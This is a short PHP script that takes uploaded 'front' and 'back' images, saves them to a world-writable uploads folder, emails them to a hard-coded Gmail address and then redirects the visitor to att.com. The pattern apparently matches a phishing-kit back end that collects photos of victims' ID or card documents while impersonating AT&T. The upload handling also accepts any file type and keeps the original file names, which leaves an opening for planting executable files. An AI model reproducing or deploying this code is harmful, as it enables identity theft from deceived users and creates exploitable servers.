<?php
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["front_image"]) && isset($_FILES["back_image"])) {
    $to = "jimmyid281@gmail.com"; // Change this to the recipient's email address
    $subject = "New Image Upload";
    $message = "Front and back images have been uploaded.";
    $headers = "From: jimmyid281@gmail.com"; // Change this to your email address
    $attachments = array();

    $target_dir = "uploads/";
    if (!file_exists($target_dir)) {
        mkdir($target_dir, 0777, true);
    }
    $front_target_file = $target_dir . basename($_FILES["front_image"]["name"]);
    if (move_uploaded_file($_FILES["front_image"]["tmp_name"], $front_target_file)) {
        $attachments[] = $front_target_file;
    } else {
        echo "Sorry, there was an error uploading the front image.";
        exit; // Stop execution if front image upload fails
    }

    $back_target_file = $target_dir . basename($_FILES["back_image"]["name"]);
    if (move_uploaded_file($_FILES["back_image"]["tmp_name"], $back_target_file)) {
        $attachments[] = $back_target_file;
    } else {
        echo "Sorry, there was an error uploading the back image.";
        exit;
    }

    $status = sendEmailWithAttachment($to, $subject, $message, $headers, $attachments);
    if ($status) {
        echo "The front and back images have been uploaded and emailed successfully.";
        header("Location: https://www.att.com/");
        exit;
    } else {
        echo "Failed to send email.";
    }
} else {
    echo "Invalid request.";
}

function sendEmailWithAttachment($to, $subject, $message, $headers, $attachments) {
    $boundary = md5(time());
    $headers .= "\r\nMIME-Version: 1.0\r\n";
    $headers .= "Content-Type: multipart/mixed; boundary=\"".$boundary."\"\r\n";
    $body = "--".$boundary."\r\n";
    $body .= "Content-Type: text/plain; charset=\"UTF-8\"\r\n";
    $body .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
    $body .= $message."\r\n";
    foreach ($attachments as $file) {
        $attachment = chunk_split(base64_encode(file_get_contents($file)));
        $body .= "--".$boundary."\r\n";
        $body .= "Content-Type: application/octet-stream; name=\"".basename($file)."\"\r\n";
        $body .= "Content-Disposition: attachment; filename=\"".basename($file)."\"\r\n";
        $body .= "Content-Transfer-Encoding: base64\r\n";
        $body .= "\r\n".$attachment."\r\n";
    }
    $body .= "--".$boundary."--";
    return mail($to, $subject, $body, $headers);
}
?>
